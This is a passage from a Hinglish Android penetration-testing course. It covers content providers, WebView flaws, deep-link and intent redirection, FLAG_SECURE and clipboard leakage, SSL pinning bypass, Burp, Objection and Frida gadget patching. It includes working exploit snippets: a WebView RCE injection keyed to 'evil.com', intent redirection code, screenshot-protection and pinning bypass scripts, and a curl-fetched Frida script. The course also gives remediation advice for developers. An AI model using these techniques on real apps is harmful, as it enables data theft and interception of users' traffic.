       var uri = Uri.parse('content://com.example.app.provider/users');
       var cursor = resolver.query(uri, null, null, null, null);
       
       if (cursor) {
           while (cursor.moveToNext()) {
               var columnCount = cursor.getColumnCount();
               for (var i = 0; i < columnCount; i++) {
                   console.log(cursor.getColumnName(i) + ': ' + cursor.getString(i));
               }
           }
           cursor.close();
       }
   });
   ```

#### ⚖️ **7. Comparison: Content Provider vs SharedPreferences**
- **Content Provider:** Structured data, inter-process sharing, SQL like queries, URI based.
- **SharedPreferences:** Key-value pairs, app-private by default, simple, no IPC.

#### 🚫 **8. Common Mistakes**
- `android:exported="true"` rakh kar permissions set na karna.
- `android:grantUriPermissions="true"` with insecure intent handling.
- Path traversal in file providers – `../` se sensitive files access.
- SQL Injection in `query()`, `insert()`, `update()`, `delete()` methods.
- Returning too much data without filtering.

#### 🌍 **9. Real-World Use Case**
**Facebook Contacts Leak (2018):** Ek third-party app ne Facebook ke exported content provider ko query kiya aur user contacts leak kar diye. Provider proper permission check nahi kar raha tha.

**Injured Android Example:** App mein ek content provider hoga jo user credentials de sakta hai. Use `adb content query` se nikaal kar dekho.

#### 🎨 **10. Visual Diagram (ASCII Art)**
```
App A (Malicious)          Android System                App B (Victim)
     |                            |                             |
     | content://victim.provider  |                             |
     | ------------------------>  |                             |
     |                            | Resolve authority           |
     |                            | Find provider in App B      |
     |                            | ------------------------>  |
     |                            |                             | Process query
     |                            | <------------------------   |
     | <-----------------------   | Return Cursor               |
     | Data stolen!               |                             |
```

#### 🛠️ **11. Best Practices (Remediation)**
- **For Pentesters:** Hamesha manifest mein exported providers check karo. `content` command se query karo. Frida se bhi dump karo.
- **For Developers:**
  - `android:exported="false"` rakho jab tak zaroori na ho.
  - Use custom permissions: `android:readPermission`, `android:writePermission`.
  - Grant URI permissions temporarily with `android:grantUriPermissions` and intent flags.
  - Validate input to prevent SQL injection.
  - Use `<provider android:protectionLevel="signature">` for same-signed apps.

#### ⚠️ **12. Consequences of Failure (Risk Analysis)**
- **Technical Impact:** Data leak (PII, credentials), data modification, data deletion.
- **Business Impact:** Privacy violation, GDPR fines, reputational damage, lawsuits.

#### ❓ **13. FAQ (Interview Questions)**
1. **Q:** Content Provider aur SQLite database mein kya antar hai?
   **A:** SQLite ek database engine hai. Content Provider ek component hai jo SQLite ya kisi bhi data source ko wrap karta hai aur dusre apps ko API provide karta hai.
2. **Q:** Content Provider ke `authorities` attribute ka kya matlab hai?
   **A:** Ye unique identifier hai jisse system provider ko recognize karta hai. URI mein use hota hai – `content://authorities/path`.
3. **Q:** Bina permission ke exported provider se data kaise read karein?
   **A:** `adb shell content query --uri content://...` se, agar provider exported hai. Ya malicious app se.
4. **Q:** Content Provider mein SQL Injection kaise rok sakte hain?
   **A:** Use parameterized queries, `selectionArgs` properly, aur avoid string concatenation.

#### 📝 **14. Summary (One Liner)**
**Content Provider – agar khula hai toh "data ka buffet", hacker ki chhutti!** 🍽️

---

## ✅ **Final Coverage Status**

| Category | Total Topics | Covered | Missing |
|----------|--------------|---------|---------|
| Lab Setup | 2 | 2 | 0 |
| Static Analysis | 8 | 7 | 1 (Content Providers) |
| Dynamic Analysis | 9 | 9 | 0 |
| **Total** | **19** | **18** | **1** |

---

### 🎯 1. Title / Topic: **Module 6.7 – WebView Vulnerabilities: The Silent Exploit Gateway**

#### Beginner Clarification
- addJavascriptInterface methods ko Android 4.2+ me JavascriptInterface annotation chahiye.
- WebView file access defaults version and target SDK ke saath change hue hain.
- Secure approach: file access only when truly needed.
🐣 2. Samjhane ke liye (Simple Analogy)
WebView ko app ke andar ka "chhota browser" samjho. Jaise browser mein koi bhi website open kar sakte ho, waise hi WebView app mein web content dikhata hai. Par agar ye browser galat tarah se configure ho, toh hacker uske through app ke andar ghus sakta hai – jaise browser ke address bar mein kuch daal kar sensitive files read kar lena.

📖 3. Technical Definition
WebView Android ka ek view component hai jo web pages display karta hai. Apps iska use login pages, terms & conditions, ya hybrid app development ke liye karte hain. WebView mein JavaScript enable ho sakti hai, aur addJavascriptInterface se Java objects expose kiye ja sakte hain, jo Remote Code Execution (RCE) ka risk create karta hai.

🧠 4. Zaroorat Kyun Hai?
Vulnerability:

setJavaScriptEnabled(true) + addJavascriptInterface → RCE.

file:// scheme access → local file read (e.g., /data/data/com.example/shared_prefs/).

Domain validation missing → phishing.

Security: Developer WebView ko restrict karta hai – sirf trusted domains, JavaScript off, no file access.

⚙️ 5. Under the Hood & Target Anatomy
File: Source code mein WebView implementation.

Common vulnerable patterns:

java
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JSObject(), "android");
webView.loadUrl("file:///data/data/com.example/shared_prefs/user.xml");  // Local file read
Hacker kya dhundhta hai?

setJavaScriptEnabled(true) calls.

addJavascriptInterface usage.

loadUrl with file:// or javascript: schemes.

Consequence: RCE, data theft, session hijacking.

💻 6. Hands-On: The Hacker's Toolkit
Steps to test WebView:

Static analysis mein WebView class search karo.

Check JavaScript enable:

java
webView.getSettings().setJavaScriptEnabled(true);  // Vulnerable if true
Check addJavascriptInterface:

java
webView.addJavascriptInterface(new MyObject(), "bridge");
Isse attacker JavaScript se bridge object ke methods call kar sakta hai.

Dynamic exploitation with Frida:

Agar vulnerable WebView mile, toh Frida se JavaScript inject karke Java method call kar sakte ho.

javascript
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('WebView loading: ' + url);
        if (url.indexOf('evil.com') >= 0) {
            // Inject JavaScript to call exposed interface
            var js = "javascript: bridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec(['id']);";
            this.loadUrl(js);
        } else {
            this.loadUrl(url);
        }
    };
});
ADB se local file read test:

Agar WebView file:// load kar raha hai, toh ADB se intent bhej kar local file open karwai ja sakti hai.

⚖️ 7. Comparison: WebView vs Chrome Custom Tabs
WebView: App ke andar embedded, full control but risky.

Chrome Custom Tabs: Separate browser process, more secure, limited control.

🚫 8. Common Mistakes
addJavascriptInterface bina proper validation ke use karna.

setAllowFileAccess(true) rakh kar file:// allow karna.

setAllowUniversalAccessFromFileURLs(true) enable karna.

🌍 9. Real-World Use Case
Stagefright-like WebView RCE (2016): Popular messaging app ne WebView mein JavaScript enable kiya aur user input sanitize nahi kiya. Attacker ne crafted link bheja aur user phone ka data steal kar liya.

🛠️ 11. Best Practices
For Developers: JavaScript sirf trusted domains ke liye enable karo. Use addJavascriptInterface carefully, only for Android 4.2+ with @JavascriptInterface annotation. Disable file access.

For Pentesters: WebView hamesha check karo – ye sabse common RCE source hai.

📝 14. Summary
WebView – app ka “khidki” jahan se hacker andar aa sakta hai!

### 🎯 1. Title / Topic: **Module 6.8 – Deep Links & Intent Scheme Exploitation**

#### Beginner Clarification
- BROWSABLE category ka matlab activity browser or deep-link source se launch ho sakti hai.
- Intent.parseUri intent string ko runtime intent object me convert karta hai.
- Weak validation ho to intent redirection abuse possible ho sakta hai.
🐣 2. Samjhane ke liye (Simple Analogy)
Deep Links ko "magic words" ki tarah samjho. Jaise kisi locked room mein andaar jaane ke liye magic word bolna padta hai ("Khulja Sim Sim"), waise hi app mein kisi specific screen (activity) ko direct open karne ke liye deep link use hota hai – jaise myapp://reset_password. Agar ye magic word galat tarah se implement ho, toh koi bhi bahar wala (malicious app) use bolkar andar aa sakta hai.

📖 3. Technical Definition
Deep Links (or App Links) URLs hote hain jo directly app ke specific content ko open karte hain. Android mein <intent-filter> ke through activities ko URL schemes se associate kiya jata hai, e.g., https://example.com ya myapp://. Intent Redirection vulnerability tab hoti hai jab ek activity intent ke through doosri activity ko data bhejti hai bina validation ke.

🧠 4. Zaroorat Kyun Hai?
Vulnerability:

Intent Redirection: Ek activity jo exported hai, usme intent data lekar usse start kiya ja sakta hai, jisse attacker kisi bhi activity ko unauthorized access de sakta hai.

Deep Link hijacking: Malicious app same scheme register karke user links intercept kar sakta hai.

Authentication Bypass: Agar deep link directly authenticated page open karta hai bina token check ke.

Security: Developer intent validation karta hai aur scheme/host check karta hai.

⚙️ 5. Under the Hood & Target Anatomy
File: AndroidManifest.xml mein <intent-filter>.

Example:

xml
<activity android:name=".ResetPasswordActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="myapp" android:host="reset" />
    </intent-filter>
</activity>
Hacker kya dhundhta hai?

Activities with VIEW action and BROWSABLE category.

Schemes like http, https, myapp, ftp, etc.

Host check missing ya weak.

Consequence: Attacker deep link through sensitive activity launch kar sakta hai, ya intent redirection se extra permissions le sakta hai.

💻 6. Hands-On: The Hacker's Toolkit
Steps to test deep links:

Manifest mein intent-filter dhundho jisme <data android:scheme> ho.

ADB se deep link trigger karo:

bash
adb shell am start -a android.intent.action.VIEW -d "myapp://reset" com.example.app
Agar activity open ho jaye, toh deep link vulnerable hai (agar authentication required thi, toh bypass).

Intent Redirection test:

Koi aisi activity dhundho jo intent receive karti hai aur us intent ka data use karke doosri activity start karti hai.

Exploit:

java
Intent intent = new Intent();
intent.setClassName("com.example.app", "com.example.app.VulnerableActivity");
intent.putExtra("redirect_intent", 
    Intent.parseUri("intent:#Intent;component=com.example.app/.SensitiveActivity;end"));
startActivity(intent);
ADB se:

bash
adb shell am start -n com.example.app/.VulnerableActivity --es redirect_intent "intent:#Intent;component=com.example.app/.SensitiveActivity;end"
Frida script to monitor intents:

javascript
Java.perform(function() {
    var Activity = Java.use('android.app.Activity');
    Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
        console.log('startActivity called with: ' + intent.toString());
        this.startActivity(intent);
    };
});
⚖️ 7. Comparison: Deep Links vs App Links
Deep Links: Custom schemes (myapp://), any app can register same scheme.

App Links: https:// with domain verification (Digital Asset Links), more secure.

🚫 8. Common Mistakes
Bina validation ke intent ka data use karna.

Host check na karna.

<data android:scheme="http" android:host="*"> – wildcard host dangerous.

🌍 9. Real-World Use Case
Facebook Intent Redirection (2018): Facebook app mein ek exported activity thi jo intent lekar doosri activity start kar rahi thi bina validation ke. Attacker us activity ke through Facebook ke internal activities launch kar sakta tha, jaise password reset.

🛠️ 11. Best Practices
For Developers: Host aur scheme strict check karo. Intent data validate karo. android:exported="false" unless required. Use App Links with domain verification.

For Pentesters: Har exported activity ke intent handling ko fuzz karo.

📝 14. Summary
Deep Links – app ke “magic words”, galat likhe to hacker ka ghar! 🪄




### 🎯 1. Title / Topic: **Module 6.9 – UI Data Leakage: Clipboard & Screenshot Protection**

#### Beginner Clarification
- Agar app FLAG_SECURE tampering detect kare to alternatives use karo.
- Example: screenrecord, external camera capture, emulator host capture.
- Authorized scope me hi sensitive UI capture methods use karo.
🐣 2. Samjhane ke liye (Simple Analogy)
Maan lo tum ATM mein PIN enter kar rahe ho, aur background mein koi photo le raha hai – problem. App ko sensitive screen par screenshot lene se rokna chahiye. Clipboard bhi aisa hi hai – agar tumne password copy kiya aur doosra app clipboard padh sake, to password leak ho jayega.

📖 3. Technical Definition
Screenshot Protection: Android mein WindowManager.LayoutParams.FLAG_SECURE set kiya jata hai sensitive activities par, jisse screenshot nahi li ja sakti aur screen recording block ho jati hai.

Clipboard Leakage: Android clipboard global hota hai – koi bhi app clipboard data read kar sakta hai (Android 10+ mein thoda restricted, lekin possible). Agar app sensitive data copy karti hai clipboard mein, to risk hai.

🧠 4. Zaroorat Kyun Hai?
Vulnerability: Agar FLAG_SECURE set nahi hai, to malware screenshot le sakta hai aur user credentials capture kar sakta hai. Agar clipboard mein password copy hota hai, to any app usse read kar sakta hai.

Security: Banking apps, payment apps, password managers – inhe screen aur clipboard dono secure rakhni chahiye.

⚙️ 5. Under the Hood & Target Anatomy
File: Source code mein activity's onCreate.

Screenshot protection code:

java
getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE);
Hacker kya dhundhta hai? Is flag ki presence. Agar nahi hai, to screenshot liya ja sakta hai.

Clipboard monitoring:

java
ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
clipboard.setPrimaryClip(ClipData.newPlainText("label", "sensitive_data"));
Hacker clipboard read kaise kare? Malicious app getPrimaryClip() call kar sakta hai.

💻 6. Hands-On: The Hacker's Toolkit
Screenshot Protection Bypass with Frida:

javascript
Java.perform(function() {
    var WindowManager = Java.use('android.view.WindowManager');
    var LayoutParams = Java.use('android.view.WindowManager$LayoutParams');
    LayoutParams.flags.value = LayoutParams.flags.value & ~LayoutParams.FLAG_SECURE;
    console.log('FLAG_SECURE removed! Screenshots allowed.');
});
Run:

bash
frida -U -f com.example.app -l bypass_secure.js
Ab app par screenshot le sakte ho.

Clipboard Monitoring:

ADB se clipboard read:

bash
adb shell settings put secure clipboard_show_access_notifications 0  # optional
adb shell service call clipboard 2  # Android 10+ ke liye
Simple Frida script to dump clipboard:

javascript
Java.perform(function() {
    var ClipboardManager = Java.use('android.content.ClipboardManager');
    var original = ClipboardManager.getPrimaryClip.implementation = function() {
        var clip = this.getPrimaryClip();
        if (clip != null) {
            console.log('Clipboard: ' + clip.getItemAt(0).getText());
        }
        return clip;
    };
});
⚖️ 7. Comparison: FLAG_SECURE vs Screenshot Detection
FLAG_SECURE: Blocks screenshots and screen recording.

Screenshot Detection Apps: Can detect if screenshot taken, but can't block. FLAG_SECURE is proper protection.

🚫 8. Common Mistakes
Sirf sensitive activities par FLAG_SECURE lagana bhoolna.

Clipboard clear na karna after copy.

WebView mein text selection allow karna, jisse clipboard leak ho.

🌍 9. Real-World Use Case
Password Manager Leak (2022): Ek password manager ne clipboard mein password copy kiya aur clear nahi kiya. Malicious app clipboard read karke password steal kar liya.

🛠️ 11. Best Practices
For Developers: Use FLAG_SECURE on all screens with sensitive data. After copying to clipboard, clear after 30 seconds. Use ClipboardManager with addPrimaryClipChangedListener to detect and clear.

For Pentesters: Check for FLAG_SECURE presence. Test clipboard leakage by copying data and reading via adb.

📝 14. Summary
FLAG_SECURE – app ka “no photography” board, clipboard – “public notice board”, dono sambhalo!

## 🎯 **Ab tak ka complete roadmap:**

### Phase 1: Lab Setup & Static Analysis Basics
- ✅ Module 4.1 – JADX-GUI
- ✅ Module 5.1 – Injured Android App
- ✅ Module 5.2 – ADB Pull APK
- ✅ Module 5.3 – AndroidManifest.xml (Activities)
- ✅ Module 5.4 – Hardcoded Strings

### Phase 2: Static Analysis Deep Dive & Dynamic Analysis Setup
- ✅ Module 6.1 – Exported Activities
- ✅ Module 6.2 – Cyberchef
- ✅ Module 6.3 – MobSF Static Analysis
- ✅ Module 6.4 – SharedPreferences Analysis
- ✅ Module 6.5 – PIDCat
- ✅ **NEW Module 6.6 – Content Providers** (ab added)
- ✅ Module 7.1 – SSL Pinning Intro
- ✅ Module 7.2 – MobSF Dynamic Analysis
- ✅ Module 7.3 – Burp Suite Setup
- ✅ Module 7.4 – Objection Automatic Patching
- ✅ Module 7.5 – Manual Patching with Frida
- ✅ Module 7.6 – Objection Commands
- ✅ Module 7.7 – Frida Codeshare
- ✅ Module 7.8 – APK-MITM & Androidunpinner
- ✅ Module 7.9 – Fingerprint Bypass

### Phase 3: Advanced Topics
- ✅ Module 8.1 – Mobexler
- ✅ Module 8.2 – Root Detection Bypass
- ✅ Module 8.3 – Custom Frida Scripts
- ✅ Module 8.4 – Emulator Detection Bypass
- ✅ Module 8.5 – Ghidra Native Analysis
- ✅ Module 8.6 – iOS Basics

---



**Yaad rakhna:** Sab kuch educational purpose hai. Bina permission ke kisi app ya device par test mat karna. Aur rooting/emulator commands se phone brick ho sakta hai – sambhal ke! 😎

---

### 🎯 1. Title / Topic: **Module 7.1 – SSL Pinning: Kya Hai Aur Kyon?**

#### 🐣 2. Samjhane ke liye (Simple Analogy)
SSL pinning ek "VIP pass" check ki tarah hai. Jab app server se baat karti hai, to server ek certificate (ID) dikhata hai. App pehle se ek specific certificate ki "copy" rakhti hai (pinned certificate). Agar server ka certificate match nahi kiya, to app baat karna band kar deti hai – taaki koi beech mein (MITM) apna fake certificate laga kar traffic na dekh le.

#### 📖 3. Technical Definition
**SSL Pinning** ek security mechanism hai jisme app server ke SSL/TLS certificate (ya public key) ko hardcode ya store kar leti hai. Jab bhi connection banta hai, app check karti hai ki server ne jo certificate diya hai wo pinned certificate se match karta hai ya nahi. Agar match nahi karta (MITM attack mein), to connection reject ho jata hai.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Hacker Burp proxy laga kar traffic intercept karna chahta hai. Par agar app pinned hai, to Burp ka certificate server ka nahi lagega, aur app connect nahi karegi.
- **Security:** Developer ne SSL pinning lagaya taaki users ka data MITM se safe rahe.

#### ⚙️ 5. Under the Hood
App ke code mein server certificate ka hash ya public key stored hota hai. Connection ke time, SSL handshake ke baad app certificate chain verify karti hai, aur phir pinned value se compare. Agar mismatch, to connection close ho jata hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
Pinning bypass karne ke liye hume:
- Objection se automatic patching
- Frida scripts se runtime hooking
- APK modification (manual)

Agle modules mein bypass techniques detail mein.

#### 📝 14. Summary
**SSL pinning – app ka “guard dog” jo proxy ko bhaga deta hai. Humein use “sone” ke liye tools chahiye!** 🐕

---

### 🎯 1. Title / Topic: **Module 7.2 – MobSF Dynamic Analysis Setup**

#### 🐣 2. Samjhane ke liye (Simple Analogy)
MobSF static analysis ne app ka blueprint de diya. Ab dynamic analysis mein hum app ko "live" run karte hain aur uska behavior dekhte hain – jaise ki kiske saath baat kar rahi hai, kya data store kar rahi hai, etc. MobSF ka "agent" ek spy camera hai jo phone par app ki har harkat record karta hai.

#### 📖 3. Technical Definition
MobSF dynamic analysis feature app ko real device/emulator par run karta hai aur runtime mein network traffic, API calls, file system changes, etc. capture karta hai. Iske liye **MobSF Agent** app device par install hota hai jo MobSF server se communicate karta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps for MobSF Dynamic Analysis:**
1. Static analysis complete karo (APK upload).
2. Dynamic analysis section mein "Start Dynamic Analysis" click karo.
3. MobSF server automatically **MobSF Agent APK** generate karega, uska link dega. Download karo.
4. Device ko connect karo (USB debugging enabled).
5. Install agent: `adb install mobsf_agent.apk`
6. Device par agent app open karo. Unique device ID display hoga.
7. MobSF web interface mein device select karo.
8. Target app ka main activity choose karo (ya koi specific).
9. MobSF device par app launch karega.
10. App ke saath interact karo – MobSF background mein traffic capture karega.
11. Stop analysis – report me network calls, logs, etc. dikhenge.

#### 🚫 8. Common Mistakes
- Device aur server same network par hone chahiye (Wi-Fi).
- USB debugging enable hona chahiye.
- Kuch emulator issues ho sakte hain, physical device better hai.

#### 📝 14. Summary
**MobSF dynamic analysis – app ki “live performance” ka CCTV footage!** 📹

---

### 🎯 1. Title / Topic: **Module 7.3 – Burp Suite Setup for Android Interception**

#### Beginner Clarification
- Android 7+ app trust model me user-installed proxy certificates by default trusted nahi hote.
- NSC me user cert source explicitly allow ho tab behavior change hota hai.
- Proxy setup ke liye host IP verify karo: Windows ipconfig, Linux or Mac ifconfig or hostname -I.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Burp Suite ek "telephone tap" hai jo app aur server ke beech ki baat (HTTP/HTTPS) record karta hai. Usse hum dekh sakte hain ki app kya data bhej rahi hai, aur usme change kar ke server ko fool bhi kar sakte hain. Par agar app SSL pinning use kar rahi hai, to pehle use bypass karna hoga (baad mein dekhenge).

#### 📖 3. Technical Definition
**Burp Suite** ek web proxy tool hai jo HTTP/HTTPS traffic ko intercept, inspect, aur modify karta hai. Android device ke Wi-Fi proxy settings mein Burp ko set karte hain, aur Burp CA certificate device mein install karte hain taaki HTTPS traffic decrypt ho sake.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps:**
1. Burp Suite install karo, open karo.
2. Proxy tab → Options → Add new listener.
   - Bind to port: 8081 (or any)
   - Bind to address: All interfaces
3. Android device ko PC ke same Wi-Fi se connect karo.
4. Device Wi-Fi settings mein jaake proxy manual set karo:
   - Hostname: PC ka IP address (e.g., 192.168.1.10)
   - Port: 8081
5. **Burp CA Certificate export:**
   - Proxy → Options → Import/Export CA Certificate
   - Export in DER format, save as `burp.cer`
6. Certificate device mein transfer karo (email, ADB push, etc.).
7. Device par Settings → Security → Install from SD card → `burp.cer` select karo, certificate install karo (give name Burp).
8. Burp mein Intercept on karo, device par koi website open karo – traffic dikhna chahiye.

**Verify:** Browser mein `http://burp` visit karo – Burp certificate milna chahiye.

#### ⚖️ 7. Command Comparison: adb push vs install
- `adb push burp.cer /sdcard/` – certificate phone mein copy karega.
- Phir user manually install karega.

#### 🚫 8. Common Mistakes
- Android 7+ par user certificates default trusted nahi hote system level par. App agar targetSdkVersion >=24 aur network security config me user certificates trust nahi karta, to SSL pinning bypass ke baad bhi traffic nahi aayega. Iske liye app patch karna hoga (objection ya manual).
- Proxy IP galat daal diya.
- Port number Burp listener se mismatch.

#### 📝 14. Summary
**Burp setup = app ki baat sunne ka “spy device”!** 🕵️

---

### 🎯 1. Title / Topic: **Module 7.4 – Patching Apps Automatically with Objection**

#### Beginner Clarification
- objection patchapk failures common hain.
- Typical causes: missing apktool, missing Java, rebuild errors, wrong gadget architecture.
- Verbose run se failure reason isolate karna easy hota hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Objection ek "smart surgeon" hai jo app ka operation kar ke usme Frida ka "chip" laga deta hai (patch). Is chip ki madad se hum runtime mein app ke andar ghus kar SSL pinning disable kar sakte hain, data nikaal sakte hain, etc. Aur sab automatically!

#### 📖 3. Technical Definition
**Objection** Frida-based runtime exploration toolkit hai. `objection patchapk` command APK ko automatically modify karta hai – usme Frida gadget inject karta hai, aur kuch common bypass (jaise SSL pinning) enable karta hai. Patched APK ko install karne ke baad, objection attach ho sakta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps:**
1. Install objection: `pip install objection`
2. Install frida-tools: `pip install frida-tools`
3. Target APK pull karo (e.g., `adb pull /data/app/.../base.apk app.apk`)
4. Patch APK:
   ```bash
   objection patchapk --source app.apk
   ```
   Output: `app.objection.apk` banega.
5. Install patched APK:
   ```bash
   adb install app.objection.apk
   ```
6. App launch karo phone par.
7. Attach objection:
   ```bash
   objection explore
   ```
   Ab objection console open hoga.
8. SSL pinning bypass karo:
   ```
   android sslpinning disable
   ```
9. Ab Burp se traffic intercept kar sakte ho.

#### ⚖️ 7. Command Comparison: objection explore vs frida
- `objection explore` – Objection ka interactive console open hota hai.
- `frida -U -n package` – Direct Frida CLI, but Objection commands easier hain.

#### 🚫 8. Common Mistakes
- Patch karne se pehle original APK backup rakh lo.
- Kuch apps objection se patch nahi hote (protections). Tab manual patching karo.
- Patched app install karne ke liye original uninstall karna padega (signature mismatch).

#### 📝 14. Summary
**Objection patchapk – “one click” mein app ko Frida-ready banao!** 💉

---

### 🎯 1. Title / Topic: **Module 7.5 – Manual Patching with Frida Gadget**

#### Beginner Clarification
- Apktool install method OS-specific hoti hai: Windows manual jar plus bat, Linux apt, Mac brew.
- Keytool prompt flow samajhna zaruri hai for keystore creation and signing.
- Wrong signing steps se patched APK install fail karega.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Jab automatic patch fail ho jaye (jaise objection kaam na kare), tab hum "manual surgery" karte hain. Hum app ko decompile karte hain, Frida gadget ki file usme daalte hain, aur manifest mein entry add karte hain. Phir rebuild karte hain. Ye thoda mushkil hai, but full control milta hai.

#### 📖 3. Technical Definition
**Manual patching** mein hum apktool se APK decompile karte hain, Frida gadget shared library (`.so`) ko lib folder mein copy karte hain, aur AndroidManifest.xml mein meta-data add karte hain taaki app start hote hi Frida gadget load ho. Phir APK rebuild aur sign karte hain.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps:**
1. Install apktool, `adb`, jarsigner, zipalign (Android SDK se).
2. Decompile APK:
   ```bash
   apktool d app.apk -o decompiled
   ```
3. Download Frida gadget from [Frida releases](https://github.com/frida/frida/releases) – choose correct arch (e.g., `frida-gadget-<version>-android-arm64.so`).
4. Copy gadget to lib folder:
   ```bash
   cp frida-gadget.so decompiled/lib/arm64-v8a/
   ```
5. Edit `decompiled/AndroidManifest.xml`:
   - `<application>` tag ke andar ye line add karo:
     ```xml
     <meta-data android:name="main" android:value="Gadget"/>
     ```
6. Rebuild APK:
   ```bash
   apktool b decompiled -o patched_unsigned.apk
   ```
7. Sign APK (generate keystore pehle baar):
   ```bash
   keytool -genkey -v -keystore my.keystore -alias myalias -keyalg RSA -keysize 2048 -validity 10000
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my.keystore patched_unsigned.apk myalias
   ```
8. Align APK (optional but recommended):
   ```bash
   zipalign -v 4 patched_unsigned.apk patched.apk
   ```
9. Install:
   ```bash
   adb install patched.apk
   ```
10. Run app – Frida gadget automatically load hoga.
11. Attach Frida:
    ```bash
    frida -U -n <package_name>
    ```
12. Ab objection use kar sakte ho, ya direct Frida scripts.

#### ⚖️ 7. Comparison: Automatic vs Manual
- **Automatic (Objection):** Fast, easy, but may fail on obfuscated apps.
- **Manual:** Time-consuming, but works where automatic fails.

#### 🚫 8. Common Mistakes
- Arch mismatch: gadget arch device arch se match hona chahiye (arm64, armeabi, x86).
- Manifest edit mein galat tag laga diya.
- Signing ke bina app install nahi hoga.
- Zipalign na karne se installation issues ho sakte hain.

#### 📝 14. Summary
**Manual patching – “do it yourself” Frida injection, power user ka tareeka!** 🔧

---

### 🎯 1. Title / Topic: **Module 7.6 – Dynamic Analysis with Objection Commands**

#### Beginner Clarification
- objection command not found error usually PATH issue hota hai.
- Windows me Python Scripts path add karo.
- Linux or Mac me local bin path add karo, fallback python module execution possible hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Jab app patch ho jaye aur objection attached ho, to humare paas remote control hai. Hum app ke andar jhaank sakte hain, uske secrets nikaal sakte hain, uske behavior change kar sakte hain. Objection commands woh remote control ke buttons hain.

#### 📖 3. Technical Definition
Objection ke `explore` mode mein Android-specific commands hoti hain jo runtime mein app ke saath interact karti hain. Jaise shared preferences dump karna, SQLite databases download karna, classes list karna, methods call karna, root detection bypass, etc.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Common Objection Commands (after `objection explore`):**

| Command | Kya karta hai |
|--------|---------------|
| `android sslpinning disable` | SSL pinning bypass |
| `android sharedpreferences list` | SharedPreferences files list |
| `android sharedpreferences get <file>` | SharedPreferences ka content dikhao |
| `android file download /data/data/<pkg>/databases/xyz.db` | SQLite DB download |
| `android hooking list classes` | Loaded classes dikhao |
| `android hooking call <class> <method>` | Specific method call karo |
| `android root disable` | Root detection bypass |
| `android intent launch <activity>` | Activity launch (exported/non-exported) |
| `android memory heapdump` | Memory dump (heap) |
| `android file download /data/data/<pkg>/shared_prefs/xyz.xml` | File download |

**Example Workflow:**
```
$ objection explore
...
(device) android sharedpreferences list
(device) android sharedpreferences get myprefs.xml
(device) android file download /data/data/com.example/databases/users.db
(device) exit
```

#### ⚖️ 7. Comparison: Objection vs Frida Scripts
- Objection: Pre-built commands, no coding required.
- Frida scripts: Customizable, but need JavaScript knowledge.

#### 🚫 8. Common Mistakes
- Commands case-sensitive hain.
- File paths ka sahi package name use karo.
- Kuch commands ke liye root zaroori ho sakti hai.

#### 📝 14. Summary
**Objection commands – app ke andar “ghus kar” data lootne ka toolbox!** 🧰

---

### 🎯 1. Title / Topic: **Module 7.7 – Frida Codeshare: Reusing Scripts**

#### Beginner Clarification
- curl unavailable ho to PowerShell download, manual script save, ya built-in curl alternative use karo.
- Codeshare script ko local file me save karke frida load karna reliable fallback hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Frida Codeshare ek "script library" hai jahan log apne frida scripts share karte hain. Jaise StackOverflow par code milta hai, waise yahan directly frida scripts milti hain – SSL bypass, root bypass, etc. Bas ID copy karo, objection mein load karo, kaam ho jayega.

#### 📖 3. Technical Definition
**Frida Codeshare** (codeshare.frida.re) ek community-driven repository hai jahan Frida scripts publicly available hain. In scripts ko objection ya frida CLI ke through directly load kiya ja sakta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Using Codeshare with Objection:**
1. Attach objection to app:
   ```bash
   objection explore
   ```
2. Find a script on [codeshare.frida.re](https://codeshare.frida.re) – e.g., "Universal Android SSL Pinning Bypass".
3. Copy the Codeshare ID (e.g., `owasp/universal-android-ssl-pinning-bypass`).
4. In objection console:
   ```
   plugin load codeshare owasp/universal-android-ssl-pinning-bypass
   ```
5. Script load ho jayega aur SSL pinning bypass ho jayega.
6. Verify with Burp.

**Using with Frida directly:**
```bash
frida -U -f <package> -l <(curl -s https://codeshare.frida.re/api/scripts/run/?id=owasp/universal-android-ssl-pinning-bypass)
```

#### ⚖️ 7. Comparison: Codeshare vs Custom Scripts
- Codeshare: Instant, tested, but may not work on all apps.
- Custom scripts: Tailored for specific app.

#### 🚫 8. Common Mistakes
- Script ka ID galat copy kiya.
- Script require specific Frida version.
- App mein jo script target karti hai wo class/method exist na kare.

#### 📝 14. Summary
**Frida Codeshare – duniya bhar ke hackers ke scripts ka “buffet”!** 🍽️

---



### 🎯 1. Title / Topic: **Module 7.8 – Alternative SSL Bypass Tools: APK-MITM & Androidunpinner**

#### Beginner Clarification
- npm command fail ho to pehle Node.js LTS install verify karo.
- npm version check ke baad hi apk-mitm global install run karo.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Objection ke alawa bhi tools hain jo SSL pinning bypass kar dete hain. APK-MITM ek "automatic patcher" hai jo APK mein changes kar deta hai taaki Burp certificate accept ho. Androidunpinner bhi aisa hi hai.

#### 📖 3. Technical Definition
- **APK-MITM:** Node.js tool hai jo APK ko decompile karta hai, network security config modify karta hai, aur user certificates allow karta hai. Ye patched APK banata hai.
